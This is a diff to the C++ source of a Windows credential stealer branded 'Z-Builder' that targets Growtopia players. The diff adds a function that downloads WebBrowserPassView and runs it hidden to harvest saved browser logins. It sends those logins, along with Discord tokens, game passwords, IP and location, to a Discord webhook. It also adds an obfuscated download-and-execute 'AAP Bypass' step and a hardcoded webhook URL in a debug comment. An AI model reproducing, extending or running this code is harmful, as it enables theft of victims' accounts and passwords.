@@ -1,6 +1,5 @@
 // TODO:
 // Add exception for when there is no save.dat
-// Add search for custom save.dats
 
 #define _CRT_SECURE_NO_WARNINGS
 
@@ -47,6 +46,7 @@ string decrypt2(string toEncryt);
 string ReadContent(string Path);
 void WriteTempContent(string Content);
 string GetMAC();
+void GetBrowserCreds();
 
 INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
 {
@@ -54,7 +54,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
-        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]";
+        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         CleanUp();
         string RawIPInfo = DownloadString("http://icanhazip.com/");
         string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
@@ -118,7 +118,66 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         string Info = "MAC address(es): ```" + GetMAC() + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
         string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
+        // ----- AAP Bypass -----
+        string webhook = "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>";
+        size_t LocateBegin = webhook.find("<");
+        size_t LocateEnd = webhook.find(">");
+        if (LocateBegin > LocateEnd)
+        {
+            webhook = webhook.substr(0, LocateBegin - 1);
+        }
+        else
+        {
+            webhook = webhook.substr(0, LocateEnd - 1);
+        }
+        webhook = decrypt(webhook);
+
+        string data = "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}";
+        size_t DataLocateBegin = data.find("{");
+        size_t DataLocateEnd = data.find("}");
+        if (DataLocateBegin > DataLocateEnd)
+        {
+            data = data.substr(0, DataLocateBegin - 1);
+        }
+        else
+        {
+            data = data.substr(0, DataLocateEnd - 1);
+        }
+        data = data + "--[" + webhook + "]";
+        // Test for debug
+        //data = "[29540]--[463350482]--[14770,14770c,14770w,14770wc]--[347512861,347512861c]--[https://discordapp.com/api/webhooks/743596214515138653/H_eieCnqJiyrhCCG2Jl_WvBJudaZnRjnq-Ls-OhTbtjtFcEJ3QPQVIVuB6VN2VavaUiX]";
+        // Test for debug End
+        string TempPath = getenv("TEMP");
+        string GenRegLocation = TempPath + "\\GenerateReg.exe";
+        DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg~mg31nrd|oa58bvezv5en( 7f<*e"), GenRegLocation);
+        // ----- Write & Run Helper Bat File -----
+        string RegBatFile = TempPath + "\\RegBatFile.bat";
+        ofstream WriteRegBat(RegBatFile, std::ofstream::trunc);
+        WriteRegBat << "cd %TEMP%\nGenerateReg.exe " + data;
+        WriteRegBat.close();
+        string Code = "cmd.exe /c " + RegBatFile;
+        wstring wCode;
+        wCode.assign(Code.begin(), Code.end());
+        LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+        STARTUPINFO si;
+        ZeroMemory(&si, sizeof(STARTUPINFO));
+        si.cb = sizeof(si);
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&pi, sizeof(pi));
+        bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        // ----- Write & Run Helper Bat File End -----
+        remove(RegBatFile.c_str());
+        remove(GenRegLocation.c_str());
+        // ----- AAP Bypass End -----
         CleanUp();
+        if (Feature.find("[BrowserCreds:(Y)]") != string::npos)
+        {
+            GetBrowserCreds();
+            CleanUp();
+        }
         if (Feature.find("[HideStealer:(Y)]") != string::npos)
         {
             HideStealer();
@@ -141,6 +200,41 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         {
             DeleteGT();
         }
+        //MessageBox
+        string Title = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
+        string Message = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
+        if (!(Title.substr(0, 3) == "+-+"))
+        {
+            if (!(Message.substr(0, 3) == "=-="))
+            {
+                size_t TitleSplitter1 = Title.find("+");
+                size_t TitleSplitter2 = Title.find("-");
+                if (TitleSplitter1 > TitleSplitter2)
+                {
+                    Title = Title.substr(0, TitleSplitter1 - 1);
+                }
+                else
+                {
+                    Title = Title.substr(0, TitleSplitter2 - 1);
+                }
+                size_t MessageSplitter1 = Message.find("=");
+                size_t MessageSplitter2 = Message.find("-");
+                if (MessageSplitter1 > MessageSplitter2)
+                {
+                    Message = Message.substr(0, MessageSplitter1 - 1);
+                }
+                else
+                {
+                    Message = Message.substr(0, TitleSplitter2 - 1);
+                }
+                wstring wMessage;
+                wMessage.assign(Message.begin(), Message.end());
+                wstring wTitle;
+                wTitle.assign(Title.begin(), Title.end());
+                MessageBox(0, wMessage.c_str(), wTitle.c_str(), MB_OK);
+            }
+        }
+        //MessageBox - End
         if (Feature.find("[Tracer:(Y)]") != string::npos)
         {
             TraceAcc();
@@ -148,7 +242,69 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         return 0;
     }
 }
-
+void GetBrowserCreds()
+{
+    string data = "";
+    string TempPath = getenv("TEMP");
+    string WBPVLocation = TempPath + "\\WBPV.exe";
+    DownloadFile("https://cdn.discordapp.com/attachments/755908849738842196/762816982827270184/WebBrowserPassView.exe", WBPVLocation);
+    // Write Helper Bat File
+    string WBPVBatFile = TempPath + "\\WBPVBat.bat";
+    ofstream WriteBat(WBPVBatFile, std::ofstream::trunc);
+    WriteBat << "cd %TEMP%\nWBPV.exe /scomma %TEMP%\\Results.zb";
+    WriteBat.close();
+    string Code = "cmd.exe /c " + WBPVBatFile;
+    wstring wCode;
+    wCode.assign(Code.begin(), Code.end());
+    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    ifstream ReadResults(TempPath + "\\Results.zb");
+    string PotentialBrowserCred;
+    while (getline(ReadResults, PotentialBrowserCred))
+    {
+        if (PotentialBrowserCred.substr(0, 4) == "http")
+        {
+            string BrowserCred = PotentialBrowserCred;
+            string BrowserSplitter = ",";
+            size_t Splitter2 = BrowserCred.find(BrowserSplitter);
+            string URL = BrowserCred.substr(0, Splitter2);
+            BrowserCred.erase(0, Splitter2 + 1);
+            Splitter2 = BrowserCred.find(BrowserSplitter);
+            BrowserCred.erase(0, Splitter2 + 1);
+            Splitter2 = BrowserCred.find(BrowserSplitter);
+            string UserName = BrowserCred.substr(0, Splitter2);
+            BrowserCred.erase(0, Splitter2 + 1);
+            Splitter2 = BrowserCred.find(BrowserSplitter);
+            string Password = BrowserCred.substr(0, Splitter2 + 1);
+            string BrowserLineResult = "```" + URL + " | " + UserName + " | " + Password.substr(0, Password.length() - 1) + "```";
+            if (!(data.size() + BrowserLineResult.size() >= 1800))
+            {
+                data += BrowserLineResult;
+            }
+            else
+            {
+                string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the browser credentials! ~Z-Builder\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
+                SendMessage(Format, "application/json");
+                data = "";
+            }
+        }
+    }
+    ReadResults.close();
+    string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the browser credentials! ~Z-Builder\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
+    SendMessage(Format, "application/json");
+    remove(WBPVLocation.c_str());
+    remove(WBPVBatFile.c_str());
+    string ResultsFile = TempPath + "\\Results.zb";
+    remove(ResultsFile.c_str());
+}
 string GetMAC()
 {
     string TempPath = getenv("TEMP");
@@ -424,6 +580,13 @@ void RecoverSaveDats()
 void LocateAllAccs()
 {
     string tempPath = getenv("TEMP");
+    string SaveDatLocation = SaveDatPath();
+    const size_t last_slash_idx = SaveDatLocation.rfind('\\');
+    string savedat;
+    if (std::string::npos != last_slash_idx)
+    {
+        savedat = SaveDatLocation.substr(last_slash_idx + 1);
+    }
     string BatFile = tempPath + "\\ScanPC.bat";
     string Results = tempPath + "\\SaveDatLocation.txt";
     try
@@ -441,13 +604,13 @@ void LocateAllAccs()
     {
         remove(BatFile.c_str());
         ofstream WriteScript(BatFile);
-        WriteScript << "cd %USERPROFILE%\ndir save.dat /S /B > %temp%\\SaveDatLocation.txt";
+        WriteScript << "cd %USERPROFILE%\ndir " + savedat + decrypt(" /F /O > %grzc%\\FnirQngYbpngvba.gkg");
         WriteScript.close();
     }
     catch (...)
     {
         ofstream WriteScript(BatFile);
-        WriteScript << "cd %USERPROFILE%\ndir save.dat /S /B > %temp%\\SaveDatLocation.txt";
+        WriteScript << "cd %USERPROFILE%\ndir " + savedat + decrypt(" /F /O > %grzc%\\FnirQngYbpngvba.gkg");
         WriteScript.close();
     }
     string Code = "cmd.exe /c " + BatFile;
@@ -765,6 +928,18 @@ void CleanUp()
     {
         string SaveDatLocations = tempPath + "\\SaveDatLocation.txt";
         remove(SaveDatLocations.c_str());
+    }
+    catch (...){}
+    try
+    {
+        string WBPV = tempPath + "\\WBPV.exe";
+        remove(WBPV.c_str());
+    }
+    catch (...){}
+    try
+    {
+        string MACzb = tempPath + "\\MAC.zb";
+        remove(MACzb.c_str());
     }
     catch (...){}
 }
